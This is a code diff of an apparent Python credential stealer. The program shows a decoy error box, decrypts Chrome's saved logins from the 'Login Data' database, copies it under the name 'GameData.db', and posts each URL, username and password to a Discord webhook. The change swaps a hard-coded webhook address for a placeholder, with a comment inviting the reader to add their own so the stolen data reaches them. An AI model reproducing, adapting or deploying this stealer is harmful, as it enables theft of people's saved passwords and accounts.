@@ -73,9 +73,8 @@ def main():
     root.withdraw() 
     messagebox.showerror("Error", "An error has occured while running this program")
     root.destroy()
-    # get the AES key
     key = get_encryption_key()
-    # local sqlite Chrome database path
+    # local sqlite Chrome database path (Might be different for different computers)
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Profile 4", "Login Data")
     filename = "GameData.db"
@@ -91,7 +90,8 @@ def main():
         date_created = row[4]
         date_last_used = row[5]        
         if username or password:
-            webhook = Discord(url="https://discord.com/api/webhooks/1166676688692838421/GNgTxII9RvBVtRke57ENdjrzXTXwOGkNsf-a6AEFJip5g1SjjGnMS6C561OPI7Tj6I8L")
+            #change 'YOUR_DISCORD_WEBHOOK' with your webhook so all the data can be sent there
+            webhook = Discord(url="YOUR_DISCORD_WEBHOOK")
             webhook.post(content=f"URL: {origin_url}, Username: {username}, Password: {password}")
 
 
